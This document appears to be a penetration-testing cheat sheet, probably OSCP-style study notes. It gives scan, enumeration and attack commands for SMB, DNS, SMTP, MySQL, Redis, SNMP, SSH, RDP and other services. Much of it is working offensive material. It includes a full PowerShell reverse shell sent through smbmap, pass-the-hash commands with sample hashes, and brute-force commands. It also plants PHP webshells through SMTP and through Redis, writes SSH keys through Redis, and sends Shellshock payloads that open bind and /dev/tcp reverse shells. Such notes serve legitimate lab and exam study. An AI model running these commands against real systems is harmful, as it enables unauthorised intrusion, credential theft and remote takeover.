# Network

## Scan for hosts

```
nmap -sn $iprange -oG - | grep Up | cut -d' ' -f2 > network.txt
```

## Port scanning

TCP Port scanner script I use.

```
wget https://raw.githubusercontent.com/rowbot1/portscanner/main/portscanner.sh
```

#### **All TCP Ports:**

```
nmap -Pn -sC -sV -oA all -vv -p- $ip
```

{% hint style="success" %}
When you're getting no where with the TCP ports - try UDP ports. Easily forgotten about!
{% endhint %}

#### **UDP Top 100:**

```
nmap -Pn -sU --top-ports 100 -oA udp -vv $ip
```

### Utilize nmap's scripts

#### Find script related to a service your interested in, example here is ftp

```
locate .nse | grep ftp
```

#### What does a script do?

```
nmap --script-help ftp-anon
```

### Uniscan

```
uniscan -u $ip -qweds
```

#### Good nmap command

```
nmap -T4 -n -sC -sV -p- -oN nmap-versions --script='*vuln*' [ip]
```

### **unicornscan + nmap = onetwopunch**

Unicornscan supports asynchronous scans, speeding port scans on all 65535 ports. Nmap has powerful features that unicornscan does not have. With onetwopunch, unicornscan is used first to identify open ports, and then those ports are passed to nmap to perform further enumeration.

```
./onetwopunch.sh -t targets.txt -i tun0 -n '-T4 -n -sC -sV -oN nmap-versions --script=*vuln*'
```

## Vulnerability scanning

NSE scripts that scans for vulnerabilities are at `ls -l /usr/share/nmap/scripts/*vuln*`.

```
nmap -p 80 --script=all $ip - Scan a target using all NSE scripts. May take an hour to complete.
nmap -p 80 --script=*vuln* $ip - Scan a target using all NSE vuln scripts.
nmap -p 80 --script=http*vuln* $ip  - Scan a target using all HTTP vulns NSE scripts.
nmap -p 21 --script=ftp-anon $ip/24 - Scan entire network for FTP servers that allow anonymous access.
nmap -p 80 --script=http-vuln-cve2010-2861 $ip/24 - Scan entire network for a directory traversal vulnerability. It can even retrieve admin's password hash.
```

### Search services vulnerabilities

```
searchsploit --exclude=dos -t apache 2.2.3
```

```
msfconsole; > search apache 2.2.3
```

## DNS

Find name servers

```
host -t ns $ip
```

### fierce

```
fierce -dns $domain
```

Find email servers

```
host -t mx $ip
```

Subdomain bruteforcing

```
for ip in $(cat list.txt); do host $ip.$website; done
```

Reverse dns lookup bruteforcing

```
for ip in $(seq 155 190);do host 50.7.67.$ip;done |grep -v "not found"
```

### Zone transfer request

{% embed url="https://www.cira.ca/resources/anycast/guide-how/using-transaction-signatures-tsig-secure-dns-server-communication" %}

When initialising a zone transfer, the attacker will first need to know the name of the zone which they are targeting and then specify the IP address of the DNS server to perform the zone transfer against.

Below is a zone transfer against an open DNS server. You can use either of the commands below:

`dig <target domain> @<dns server> axfr`\
`host -l <target domain> <dns server>`

`dig @[DNS SERVER HERE] axfr [DOMAIN NAME HERE]`

_The ‘@’ symbol is used to specify the target DNS server_

```
host -l $ip ns1.$ip
```

```
dnsrecon -d $ip -t axfr
```

Finds nameservers for a given domain

```
host -t ns $ip| cut -d " " -f 4 #
```

```
dnsenum $ip
```

Nmap zone transfer scan

```
nmap $ip --script=dns-zone-transfer -p 53
```

Finds the domain names for a host.

```
whois $ip
```

Find the IP and authoritative servers.

```
nslookup $ip
```

Finds miss configure DNS entries.

```
host -t ns $ip
```

TheHarvester finds subdomains in google, bing, etc

```
python theHarvester.py  -l 500 -b all -d $ip
```

## SMB and SAMBA

Server Message Block (**SMB**) Protocol is a network file sharing protocol, and as implemented in Microsoft **Windows**

**Samba** has provided secure, stable and fast file and print services for all clients using the SMB/CIFS protocol, such as all versions of DOS and Windows, OS/2, Linux and many others

| SMB Version | Windows version                                                          |
| ----------- | ------------------------------------------------------------------------ |
| CIFS        | Microsoft Windows NT 4.0                                                 |
| SMB 1.0     | Windows 2000, Windows XP, Windows Server 2003 and Windows Server 2003 R2 |
| SMB 2.0     | Windows Vista & Windows Server 2008                                      |
| SMB 2.1     | Windows 7 and Windows Server 2008 R2                                     |
| SMB 3.0     | Windows 8 and Windows Server 2012                                        |
| SMB 3.0.2   | Windows 8.1 and Windows Server 2012 R2                                   |
| SMB 3.1.1   | Windows 10 and Windows Server 2016                                       |

#### SMB uses the following TCP and UDP ports:

```
netbios-ns 137/tcp # NETBIOS Name Service
netbios-ns 137/udp
netbios-dgm 138/tcp # NETBIOS Datagram Service
netbios-dgm 138/udp
netbios-ssn 139/tcp # NETBIOS session service
netbios-ssn 139/udp
microsoft-ds 445/tcp # if you are using Active Directory
```

### Checklist <a href="#checklist" id="checklist"></a>

* Enumerate Hostname - `nmblookup -A $ip`
* List Shares
  * `smbmap -H $ip`
  * `echo exit | smbclient -L \\\\$ip`
  * `nmap --script smb-enum-shares -p 139,445 $ip`
* Check Null Sessions
  * `smbmap -H $ip`
  * `rpcclient -U "" -N $ip`
  * `smbclient \\\\$ip\\[share name]`
* Check for Vulnerabilities - `nmap --script smb-vuln* -p 139,445 $ip`
* Overall Scan - `enum4linux -a $ip`
* Manual Inspection
  * `smbver.sh $ip (port)`

Get a shell with smbmap

```
smbmap -u jsmith -p 'R33nisP!nckle' -d ABC -h 192.168.2.50 -x 'powershell -command "function ReverseShellClean {if ($c.Connected -eq $true) {$c.Close()}; if ($p.ExitCode -ne $null) {$p.Close()}; exit; };$a=""""192.168.0.153""""; $port=""""4445"""";$c=New-Object system.net.sockets.tcpclient;$c.connect($a,$port) ;$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize  ;$p=New-Object System.Diagnostics.Process  ;$p.StartInfo.FileName=""""cmd.exe""""  ;$p.StartInfo.RedirectStandardInput=1  ;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0  ;$p.Start()  ;$is=$p.StandardInput  ;$os=$p.StandardOutput  ;Start-Sleep 1  ;$e=new-object System.Text.AsciiEncoding  ;while($os.Peek() -ne -1){$out += $e.GetString($os.Read())} $s.Write($e.GetBytes($out),0,$out.Length)  ;$out=$null;$done=$false;while (-not $done) {if ($c.Connected -ne $true) {cleanup} $pos=0;$i=1; while (($i -gt 0) -and ($pos -lt $nb.Length)) { $read=$s.Read($nb,$pos,$nb.Length - $pos); $pos+=$read;if ($pos -and ($nb[0..$($pos-1)] -contains 10)) {break}}  if ($pos -gt 0){ $string=$e.GetString($nb,0,$pos); $is.write($string); start-sleep 1; if ($p.ExitCode -ne $null) {ReverseShellClean} else {  $out=$e.GetString($os.Read());while($os.Peek() -ne -1){ $out += $e.GetString($os.Read());if ($out -eq $string) {$out="""" """"}}  $s.Write($e.GetBytes($out),0,$out.length); $out=$null; $string=$null}} else {ReverseShellClean}};"' 
```

Quick script to check for vulns

```
https://github.com/rowbot1/OSCP-note/blob/master/ENUMERATION/SMB/SMB-check-vulns.rb
```

mblookup — NetBIOS over TCP/IP client used to lookup NetBIOS names

### Scanning for the NetBIOS Service

SMB NetBIOS service listens on TCP ports 139 and 445, as well as several UDP ports.

`nmap -p 139,445 --open -oG smb.txt 192.168.1.0/24`

`nbtscan -r 192.168.1.0/24`

#### Null Session Enumeration

**Vulnerable SMB Versions**

#### Vulnerable versions:

```
Windows NT, 2000, and XP (most SMB1) - VULNERABLE: Null Sessions can be created by default
Windows 2003, and XP SP2 onwards - NOT VULNERABLE: Null Sessions can't be created default
Most Samba (Unix) servers
```

List of SMB versions and corresponding Windows versions:

```
SMB1 – Windows 2000, XP and Windows 2003.
SMB2 – Windows Vista SP1 and Windows 2008
SMB2.1 – Windows 7 and Windows 2008 R2
SMB3 – Windows 8 and Windows 2012.
```

Empty LM and NTLM hashes:

```
Empty LM Hash: aad3b435b51404eeaad3b435b51404ee
Empty NT Hash: 31d6cfe0d16ae931b73c59d7e0c089c0
```

**rpcclient**

Manually probe a SMB server

```
rpcclient -U '' $ip
Password:
rpcclient $> srvinfo # operating system version
rpcclient $> netshareenumall # enumerate all shares and its paths
rpcclient $> enumdomusers # enumerate usernames defined on the server
rpcclient $> getdompwinfo # smb password policy configured on the server
```

Apparently the rpcclient version in OffSec VM does not work well with creating null sessions. A downgrade to samba-4.5.15 is required: [https://forums.offensive-security.com/showthread.php?12943-Found-solution-to-enum4linux-rpcclient-problem-NT\_STATUS\_INVALID\_PARAMETER\&highlight=NT\_STATUS\_INVALID\_PARAMETER](https://forums.offensive-security.com/showthread.php?12943-Found-solution-to-enum4linux-rpcclient-problem-NT\_STATUS\_INVALID\_PARAMETER\&highlight=NT\_STATUS\_INVALID\_PARAMETER) Place the export commands into a script and source it before using rpcclient to use the downgraded version, or place it in bashrc. NOTE, once downgraded, pth-winexe doesn't seem to work.

**enum4linux**

Wrapper around smb programs like `rpcclient` to automate enumerating an SMB server. Produces tons of results when a null session is successful. NOTE: Make sure to downgrade rpcclient before using.

```
enum4linux -a $ip
enum4linux -u 'guest' -p '' -a $ip
```

**CrackMapExec**

Works perfectly, list shares and permissions, enum users, disks, code execute and run modules like mimikatz. Hashes work. Also will tell you exact version of Windows

```
crackmapexec -u 'guest' -p '' --shares $ip
crackmapexec -u 'guest' -p '' --rid-brute 4000 $ip
crackmapexec -u 'guest' -p '' --users $ip
crackmapexec smb 192.168.1.0/24 -u Administrator -p P@ssw0rd
crackmapexec smb 192.168.1.0/24 -u Administrator -H E52CAC67419A9A2238F10713B629B565:64F12CDDAA88057E06A81B54E73B949B
crackmapexec -u Administrator -H E52CAC67419A9A2238F10713B629B565:64F12CDDAA88057E06A81B54E73B949B -M mimikatz 192.168.1.0/24
crackmapexec -u Administrator -H E52CAC67419A9A2238F10713B629B565:64F12CDDAA88057E06A81B54E73B949B -x whoami $ip
crackmapexec -u Administrator -H E52CAC67419A9A2238F10713B629B565:64F12CDDAA88057E06A81B54E73B949B --exec-method smbexec -x whoami $ip# reliable pth code execution
```

Also will tell you exact version of windows:

**smbmap**

Works well for listing and downloading files, and listing shares and permissions. Hashes work. Code execution doesn't work.

```
smbmap -u '' -p '' -H $ip # similar to crackmapexec --shares
smbmap -u guest -p '' -H $ip
smbmap -u Administrator -p aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 -H $ip
smbmap -u Administrator -p aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 -H $ip -r # list top level dir
smbmap -u Administrator -p aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 -H $ip -R # list everything recursively
smbmap -u Administrator -p aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 -H $ip -s wwwroot -R -A '.*' # download everything recursively in the wwwroot share to /usr/share/smbmap. great when smbclient doesnt work
smbmap -u Administrator -p aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 -H $ip -x whoami # no work
```

\*\*\*\*

{% hint style="success" %}
Ippsec using this tool\
[https://www.youtube.com/watch?v=jUc1J31DNdw\&t=445s](https://www.youtube.com/watch?v=jUc1J31DNdw\&t=445s)
{% endhint %}

generally works a bit better than enum4linux as it enum4linux tends to error out a bit

{% hint style="info" %}
downloads to the `/usr/share/smbmap` directory
{% endhint %}

```
smb: \> RECURSE ON
smb: \> PROMPT OFF
smb: \> mget *
```

#### Download all

```
smbmap -R $sharename -H $ip -A $fileyouwanttodownload -q #downloads a file in quiet mode
```

```
smbmap -R $sharename -H $ip #Recursively list dirs, and files
```

```
smbmap -H $ip
```

default port it checks is 445, use -P 139 to point it at that port if 445 fails

### **smbclient**

Access SMB shares interactively, seems to work with anonymous access. Hashes don't work.

```
smbclient //$ip/wwwroot
smbclient //$ip/C$ WIN20082017 -U Administrator
smbclient //$ip/C$ A433F6C2B0D8BB92D7288ECFFACFC7CD -U Administrator --pw-nt-hash # make sure to only use the NT portion of the hash
```

WARNING, be careful when using the `get` command to download absolute path files from the remote system. Eg. `get /etc/passwd` will download the passwd file and overwrite YOUR `/etc/passwd`. Use `get /etc/passwd /tmp/passwd` instead.

To download recursively:

```
# Within smbclient, download everything recursively:
mask ""
recurse ON
prompt OFF
cd 'path\to\remote\dir'
lcd '~/path/to/download/to/'
mget *
```

**pth-winexe**

Works great sometimes. Can open a windows cmd shell.

```
pth-winexe -U administrator%WIN20082017 //$ipcmd # using a plaintext password
pth-winexe -U Administrator%A433F6C2B0D8BB92D7288ECFFACFC7CD //$ipcmd # ntlm hash encrypted with https://www.browserling.com/tools/ntlm-hash
pth-winexe -U domain/user%A433F6C2B0D8BB92D7288ECFFACFC7CD //$ipcmd # domain user
pth-winexe -U Administrator%8F49412C8D29DF02FB62879E33FBB745:A433F6C2B0D8BB92D7288ECFFACFC7CD //$ip cmd # lm+ntlm hash encrypted with https://asecuritysite.com/encryption/lmhash
pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:A433F6C2B0D8BB92D7288ECFFACFC7CD //$ip cmd # ntlm hash + empty lm hash
# or
export SMBHASH=aad3b435b51404eeaad3b435b51404ee:6F403D3166024568403A94C3A6561896
pth-winexe -U Administrator% //$ip cmd
```

#### smbenum.sh

```
#!/bin/bash

#SMB Enumeration using nmap
#(c) Mike Digital Offensive

if [ -z "$1" ]
 then
  echo "Error please provide host to enumerate"
  exit
else
 nmap -script=smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse $1
fi
```

### Samba version checker

#### smbver.sh

```
#!/bin/sh
#Author: rewardone
#Description:
# Requires root or enough permissions to use tcpdump
# Will listen for the first 7 packets of a null login
# and grab the SMB Version
#Notes:
# Will sometimes not capture or will print multiple
# lines. May need to run a second time for success.
if [ -z $1 ]; then echo "Usage: ./smbver.sh RHOST {RPORT}" && exit; else rhost=$1; fi
if [ ! -z $2 ]; then rport=$2; else rport=139; fi
tcpdump -s0 -n -i tap0 src $rhost and port $rport -A -c 7 2>/dev/null | grep -i "samba\|s.a.m" | tr -d '.' | grep -oP 'UnixSamba.*[0-9a-z]' | tr -d '\n' & echo -n "$rhost: " &
echo "exit" | smbclient -L $rhost 1>/dev/null 2>/dev/null
echo "" && sleep .1 
```

```
nmblookup -A $ip
```

```
enum4linux -a $ip
```

Used to enumerate data from Windows and Samba hosts and is a wrapper for `smbclient`, `rpcclient`, `net` and `nmblookup`

{% hint style="info" %}
Look for users, groups, shares, workgroup/domains and password policies
{% endhint %}

list smb nmap scripts

```
locate .nse | grep smb
```

### find SAMBA version number using the SMB OS discovery script:

```
nmap -A $ip -p139
```

then google to see if version is vulnerable

```
SAMBA 3.x-4.x #  vulnerable to linux/samba/is_known_pipename
SAMBA 3.5.11 # vulnerable to linux/samba/is_known_pipename
```

###

#### Brute force login

```
medusa -h $ip -u userhere -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt -M smbnt
nmap -p445 --script smb-brute --script-args userdb=userfilehere,passdb=/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt $ip  -vvvv
```

### RID

Rid Enum is a RID cycling attack that attempts to enumerate user accounts through null sessions and the SID to RID enum. If you specify a password file, it will automatically attempt to brute force the user accounts when its finished enumerating.

```
https://tools.kali.org/maintaining-access/ridenum
```

### Null Session

A null SMB session can be used to gather passwords and useful information from SMB 1 by looking in shares that are not password protected for interesting files. Windows NT/2000 XP default settings allow this. Windows 2003/XP SP2 SMB this behaviour is disabled.

#### Null session and extract information.

```
nbtscan -r $ip
```

#### Version

```
msfconsole; use auxiliary/scanner/smb/smb_version; set RHOSTS $ip; run
```

MultiExploit

```
msfconsole; use exploit/multi/samba/usermap_script; set lhost 10.10.14.x; set rhost $ip; run
```

#### Show all nmap SMB scripts

```
ls -ls /usr/share/nmap/scripts/smb*
```

Quick enum:

```
nmap --script=smb-enum* --script-args=unsafe=1 -T5 $ip
```

Quick vuln scan:

```
nmap --script=smb-vuln* --script-args=unsafe=1 -T5 $ip
```

Full enum and vuln scanning:

```
nmap --script=smb2-capabilities,smb-print-text,smb2-security-mode.nse,smb-protocols,smb2-time.nse,smb-psexec,smb2-vuln-uptime,smb-security-mode,smb-server-stats,smb-double-pulsar-backdoor,smb-system-info,smb-vuln-conficker,smb-enum-groups,smb-vuln-cve2009-3103,smb-enum-processes,smb-vuln-cve-2017-7494,smb-vuln-ms06-025,smb-enum-shares,smb-vuln-ms07-029,smb-enum-users,smb-vuln-ms08-067,smb-vuln-ms10-054,smb-ls,smb-vuln-ms10-061,smb-vuln-ms17-010,smb-os-discovery --script-args=unsafe=1 -T5 $ip
```

Full enum & vuln scan:

```
nmap -p139,445 -T4 -oN smb_vulns.txt -Pn --script 'not brute and not dos and smb-*' -vv -d $ip
```

Mount:

```
smbclient //$ip/share -U username
```

```
smblclient -N -L \\$ip
```

Anonymous mount:

```
smbclient //$ip/share # hit enter with blank password
```

### Eternal Blue

Exploits a critical vulnerability in the SMBv1 protocol

{% hint style="success" %}
Worth testing Eternal blue - you might get lucky although (the system should be patched to fix this)
{% endhint %}

### Vulnerable versions

Windows 7, 8, 8.1 and Windows Server 2003/2008/2012(R2)/2016

```
nmap -p 445 $ip --script=smb-vuln-ms17-010
```

Bruteforce

```
hydra -l administrator -P /usr/share/wordlists/rockyou.txt -t 1 $ip smb
```

Any metasploit exploit through Netbios over TCP in 139, you need to set:

```
set SMBDirect false
```

## NFS

Show all mounts

```
showmount -e $ip
```

Mount a NFS share

```
mount $ip:/vol/share /mnt/nfs
```

Use nfspy to mount a share. Will get around permission errors

```
nfspysh -o server=$ip:/home/vulnix/
```

##

## Mysql

```
nmap -sV -Pn -vv --script=mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 $ip -p 3306
```

#### Nmap scan

```
nmap -sV -Pn -vv -script=mysql* $ip -p 3306
```

#### Vuln scanning:

```
sqlmap -u 'http://$ip/login-off.asp' --method POST  --data 'txtLoginID=admin&txtPassword=aa&cmdSubmit=Login' --all --dump-all
```

If Mysql is running as root and you have access, you can run commands:

```
mysql> select do_system('id');
mysql> \! sh
```

#### Enumerate MSSQL Servers on the network

```
msf > use auxiliary/scanner/mssql/mssql_ping
nmap -sU --script=ms-sql-info $ip
```

#### Bruteforce MsSql

```
msf auxiliary(mssql_login) > use auxiliary/scanner/mssql/mssql_login
```

#### Gain shell using gathered credentials

```
msf > use exploit/windows/mssql/mssql_payload
msf exploit(mssql_payload) > set PAYLOAD windows/meterpreter/reverse_tcp
```

#### Log in to a MsSql server:

```
# root@kali:~/dirsearch# cat ../.freetds.conf
[someserver]
host = $ip
port = 1433
tds version = 8.0
user=sa

root@kali:~/dirsearch# sqsh -S someserver -U sa -P PASS -D DB_NAME
```

## SMTP

### Things to remember:

* Used to send mail
* Always do users enumeration
*   Mail is stored (in linux) in /var/log/mail/username. If you have LFI maybe you can connect to mail server and input webshell.

    * `telnet $ip 25 EHLO rowbot MAIL FROM:rowbot@test.com RCPT TO:$usernamehere DATA Subject: shell <?php system($_GET['cmd']); ?> . quit`

    `symfonos:1 box`

Completed machine with the above vulnerability: Symfonos:1

Commands\
[https://serversmtp.com/smtp-commands/](https://serversmtp.com/smtp-commands/)

```
HELO
It’s the first SMTP command: is starts the conversation identifying the sender server and is generally followed by its domain name.

EHLO
An alternative command to start the conversation, underlying that the server is using the Extended SMTP protocol.

MAIL FROM
With this SMTP command the operations begin: the sender states the source email address in the “From” field and actually starts the email transfer.

RCPT TO
It identifies the recipient of the email; if there are more than one, the command is simply repeated address by address.

SIZE
This SMTP command informs the remote server about the estimated size (in terms of bytes) of the attached email. It can also be used to report the maximum size of a message to be accepted by the server.

DATA
With the DATA command the email content begins to be transferred; it’s generally followed by a 354 reply code given by the server, giving the permission to start the actual transmission.

VRFY
The server is asked to verify whether a particular email address or username actually exists.

TURN
This command is used to invert roles between the client and the server, without the need to run a new connaction.

AUTH
With the AUTH command, the client authenticates itself to the server, giving its username and password. It’s another layer of security to guarantee a proper transmission.

RSET
It communicates the server that the ongoing email transmission is going to be terminated, though the SMTP conversation won’t be closed (like in the case of QUIT).

EXPN
This SMTP command asks for a confirmation about the identification of a mailing list.

HELP
It’s a client’s request for some information that can be useful for the a successful transfer of the email.

QUIT
It terminates the SMTP conversation.
```

```
for server in $(cat smtpmachines); do echo "******************" $server "*****************"; smtp-user-enum -M VRFY -U userlist.txt -t $server;done #for multiple servers
```

```
smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t $ip
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt  -t $ip
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Honeypot-Captures/multiplesources-users-fabian-fingerle.de.txt -t $ip > smtpuserenum
then grep exists
```

```
use auxiliary/scanner/smtp/smtp_enum
```

Python script

```
#!/usr/bin/python
import socket
import sys

if len(sys.argv) != 2:
        print "Usage: vrfy.py <username>"
        sys.exit(0)
# Create a Socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# Connect to the Server
connect = s.connect(('192.168.1.234',25))
# Receive the banner
banner = s.recv(1024)
print banner
# VRFY a user
s.send('VRFY ' + sys.argv[1] + '\r\n')
result = s.recv(1024)
print result
# Close the socket
s.close()
```

Command to check if a user exists

```
VRFY root
```

Command to ask the server if a user belongs to a mailing list

```
EXPN root
```

Enumeration and vuln scanning:

```
nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 $ip
```

#### Bruteforces

```
hydra -P /usr/share/wordlistsnmap.lst $ip smtp -V
```

#### Metasploit user enumeration

```
use auxiliary/scanner/smtp/smtp_enum
```

#### Testing for open relay

```
telnet $ip 25
EHLO root
MAIL FROM:root@target.com
RCPT TO:example@gmail.com
DATA
Subject: Testing open mail relay.
Testing SMTP open mail relay. Have a nice day.
.
QUIT
```

## RPC (135)

#### Enumerate, shows if any NFS mount exposed:

```
rpcinfo -p $ip
```

Get a list of .exe's that are using either TCP UDP HTTP and SMB via named pipes

```
 rpcdump.py $ip | grep .exe | awk '{print $2}'
```

```
nmap $ip --script=msrpc-enum
```

```
msf > use exploit/windows/dcerpc/ms03_026_dcom
```

## FTP enumeration

#### Enumerate:

```
nmap --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 $ip
```

{% hint style="warning" %}
If anonymous login or any other login is allowed but you can't get Filezilla to open it. Play about with the connection settings, ACTIVE\PASSIVE\AUTO.
{% endhint %}

#### Bruteforce

```
hydra -l user -P /usr/share/john/password.lst ftp://$ip:21
```

#### Bruteforce with metasploit

```
msfconsole -q msf> search type:auxiliary login: msf> use auxiliary/scanner/ftp/ftp_login
```

#### Vuln scan

```
nmap --script=ftp-* -p 21 $ip
```

### TFTP

If unauthenticated access is allowed with write permissions you can upload a shell:

```
tftp $ip
tftp> ls
?Invalid command
tftp> verbose
Verbose mode on.
tftp> put shell.php
Sent 3605 bytes in 0.0 seconds [inf bits/sec]
```

```
nmap -sU -p 69 --script tftp-enum.nse $ip 
```

or

```
use auxiliary/scanner/tftp/tftpbrute
```

`connecting/interacting: tftp $ip tftp> put payload.exe tftp> get file.txt`

## SSH

#### User enumeration

```
use auxiliary/scanner/ssh/ssh_enumusers
set user_file /usr/share/wordlists/metasploit/unix_users.txt
or
set user_file /usr/share/seclists/Usernames/Names/names.txt
run
```

```
python /usr/share/exploitdb/exploits/linux/remote/40136.py -U /usr/share/wordlists/metasploit/unix_users.txt $ip
```

If you see the following message, it likely means that scp

```
PTY allocation request failed on channel 0
```

#### Bruteforce

```
hydra -v -V -l root -P password-file.txt $ip ssh
```

#### With list of users:

```
hydra -v -V -L user.txt -P /usr/share/wordlists/rockyou.txt -t 16 192.168.33.251 ssh
```

* You can use **-w** to slow down

## SSL

#### Open a connection

```
openssl s_client -connect $ip:443
```

#### Basic SSL ciphers check

```
nmap --script ssl-enum-ciphers -p 443 $ip
```

* Look for unsafe ciphers such as Triple-DES and Blowfish
* Very complete tool for SSL auditing is testssl.sh, finds BEAST, FREAK, POODLE, heart bleed, etc...

## SNMP

### Enumeration

enumerate Community strings

```
./onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt 10.11.1.73
```

{% hint style="danger" %}
Community string too long\
If you see this download onesixtyone from Github and run it there
{% endhint %}

#### v1

```
snmp-check -t $ip -c public
```

use nmap to enumerate info

```
nmap -sU -p161 --script "snmp-*" $ip
```

### snmpwalk

```
apt install snmp-mibs-downloader #translates MIBs into readable format
```

```
for community in public private manager; do snmpwalk -c $community -v1 $ip; done
snmpwalk -c public -v1 $ip
snmpenum $ip public windows.txt
```

Less noisy:

```
snmpwalk -c public -v1 $ip 1.3.6.1.4.1.77.1.2.25
```

Based on UDP, stateless and susceptible to UDP spoofing

```
nmap -sU --open -p 16110.1.1.1-254 -oG out.txt
```

```
snmpwalk -c public -v1  10.1.1.1 # we need to know that there is a community called public
snmpwalk -c public -v1 192.168.11.204 1.3.6.1.4.1.77.1.2.25 # enumerate windows users
snmpwalk -c public -v1 192.168.11.204 1.3.6.1.2.1.25.4.2.1.2 # enumerates running processes
```

```
nmap -vv -sV -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes $ip
```

## POP3

### Test authentication:

```
telnet $ip 110
USER uer@$ip
PASS admin
list
retr 1
```

## Finger

### port 79

```
https://touhidshaikh.com/blog/?p=914
```

### **Find Logged in users on target.**

```
finger @$ip
if there is no user logged in this will show no username
```

#### **Check User is existed or not.**

```
finger $username@$ip
```

The finger command is very useful for checking users on target but it’s painful if brute-forced for a username.

### Using Metasploit fo Brute-force target

```
use auxiliary/scanner/finger/finger_users
set rhosts $ip
set users_file 
run
```

```
cd /tmp/
wget http://pentestmonkey.net/tools/finger-user-enum/finger-user-enum-1.0.tar.gz
tar -xvf finger-user-enum-1.0.tar.gz
cd finger-user-enum-1.0
perl finger-user-enum.pl -t 10.22.1.11 -U /tmp/rockyou-top1000.txt
```

## RDP

Install RDP nmap scripts

```
https://fadedlab.wordpress.com/2019/06/13/using-nmap-to-extract-windows-info-from-rdp/amp/
```

```
nmap -p 3389 --script rdp-ntlm-info $ip
```

#### Bruteforce

```
ncrack -vv --user administrator -P password-file.txt rdp://$ip
```

```
hydra -t 4  -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip
```

## Kerberos

Test MS14-068

## Redis

### Shell

First, the web server on the server broadcasts, including a simple PHP code and create a back door, which will help us to execute commands on the server.

```
CONFIG SET dir /var/www/html/
CONFIG SET dbfilename shell.php
CONFIG GET dbfilename

1) "dbfilename"
2) "shell.php"

SET cmd "<?php system($_GET['cmd']); ?>"
OK
BGSAVE
```

which can be accessed using

```
http://$ip/shell.php?cmd=whoami
www-data
```

### Upload SSH key

Second, file type found in the users home directory because it is our right and remote SSH access with a key instead of using the password used to connect to create key, they may be directly un-encrypted user rights that provide access to the system.

```
1:  ssh-keygen -t rsa
2:
3:  (echo -e "\n"; cat id_rsa.pub; echo -e "\n") > auth_key
4:
5:  cat auth_key | redis-cli -h hostname -x set crackit
6:  redis-cli -h hostname
7:
8:  config set dir /root/.ssh/
9:  config get dir
10:  config set dbfilename "authorized_keys"
11:  save
12:
13:  config set dir /home/user/.ssh/
14:  save
15:
16:  config set dir /home/admin/.ssh/
17:
18:  ssh user@kevgir -p 1322 -i id_rsa
```

1 - He has given parameters in line with a 2048-bit RSA key pair is generated. We can give it a password when we log in

3 - The public key of his own and to receive the new line last line auth\_key name we are writing a new file. We will upload this file to the target machine via the Redis server.

5 and 6. data from the key input in the standard line that we say we do, and then take the memory contents auth\_key entry Redis server.

8, 9, 10, 11 in which the location of the file content to be installed in the line number, which is stated to be added to the bottom of the file. SAVE transactions made by the commands are processed on the server side to make it happen.

13 and 16 lines in the root of the same process that we have done for other users in order to gain access with the privileges they also inside the ssh folder in the main folder authorized\_keys are doing the same procedure for writing to file.

## LDAP

#### Enumeration:

```
ldapsearch -h $ip -p 389 -x -b "dc=mywebsite,dc=com"
```

## Email addresses enumeration

Find emails in google, bing, pgp etc

```
theharvester -d $ip -b google
```

Contact information for the domains they host

```
whois $ip
```

Find emails and employee name with Recon-ng:

```
recon-ng; use module; set DOMAIN $ip; run;
recon/contacts/gather/http/api/whois_pocs
```

Find xss published ad xssed.co

```
recon/hosts/enum/http/web/xssed
```

Find subdomain

```
recon/hosts/gather/http/web/google_site
```

Finds IPs close to the domain and possible new domains

```
recon/hosts/gather/http/web/ip_neighbor
```

Google search

* site:xxx -site:www.xxx
* filetype: look for specific documents, pdf, docx, etc..
* inurl
* intitle
* Others https://www.exploit-db.com/google-hacking-database/

### nmap has many vulnerability scanning NSE scripts in /usr/share/nmap/scripts/

OpenVAS

* Powerful vulnerability scanner with thousands of scan checks. Setup:

```
openvas-setup; openvas-adduser; gsd
```

## Well known exploits

### Shellshock

The following tool will test it.

```
git clone https://github.com/nccgroup/shocker; cd shocker; ./shocker.py -H $ip  --command "/bin/cat /etc/passwd" -c /cgi-bin/status --verbose;  ./shocker.py -H $ip  --command "/bin/cat /etc/passwd" -c /cgi-bin/admin.cgi --verbose
```

You can also:

```
echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc $ip 80
```

```
curl -x TARGETADDRESS -H "User-Agent: () { ignored;};/bin/bash -i >& /dev/tcp/HOSTIP/1234 0>&1" $ip/cgi-bin/status
```

```
